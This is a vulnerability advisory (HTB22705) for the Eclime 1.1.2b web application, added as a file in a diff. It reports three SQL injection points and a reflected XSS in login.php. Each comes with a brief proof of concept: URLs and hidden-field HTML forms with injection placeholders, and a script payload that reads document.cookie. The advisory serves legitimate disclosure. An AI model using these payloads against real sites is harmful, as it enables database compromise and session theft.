@@ -1,0 +1,77 @@
+Vulnerability ID: HTB22705
+Reference: http://www.htbridge.ch/advisory/sql_injection_in_eclime_1.html
+Product: Eclime
+Vendor: www.eclime.com ( http://www.eclime.com/ ) 
+Vulnerable Version: 1.1.2b
+Vendor Notification: 16 November 2010 
+Vulnerability Type: SQL Injection
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in ref variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+http://[host]/?ref=123%27SQL_CODE_HERE
+
+SQL Injection:
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in poll_id & poll_options_id variables.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+<form action="http://[host]/index.php?poll_action=vote" method="post">
+<input name="poll_options_id" value="1" type="hidden">
+<input name="poll_id" type="hidden" value="1'SQL_CODE_HERE" >
+<input type="submit" value="submit" name="submit" />
+</form>
+
+SQL Injection:
+Vulnerability Details:
+The vulnerability exists due to failure in the "/create_account.php" script to properly sanitize user-supplied input in country variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+
+<form action="http://[host]/create_account.php" method="post" name="main" >
+<input type="hidden" name="action" value="process" id="action" />
+<input type="hidden" name="email_address" value="email@address.com" />
+<input type="hidden" name="password" value="password" />
+<input type="hidden" name="confirmation" value="password" />
+<input type="hidden" name="gender" value="m" />
+<input type="hidden" name="firstname" value="firstname" />
+<input type="hidden" name="lastname" value="lastname" />
+<input type="hidden" name="dob_month" value="01" />
+<input type="hidden" name="dob_day" value="01" />
+<input type="hidden" name="dob_year" value="1987" />
+<input type="hidden" name="street_address" value="street_address" />
+<input type="hidden" name="city" value="city" />
+<input type="hidden" name="state" value="state" />
+<input type="hidden" name="postcode" value="1234" />
+<input type="hidden" name="phoneAreaCode" value="123" />
+<input type="hidden" name="phonePrefix" value="123" />
+<input type="hidden" name="phoneNumber" value="123" />
+<input type="hidden" name="country" value="'SQL_CODE_HERE" />
+<input type="submit" value="submit" name="submit" />
+</form>
+
+XSS:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "/login.php" script to properly sanitize user-supplied input in "reason" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+The following PoC is available:
+
+
+http://[host]/login.php?login=fail&reason=<script>alert(document.cookie);</script>
+
+
+
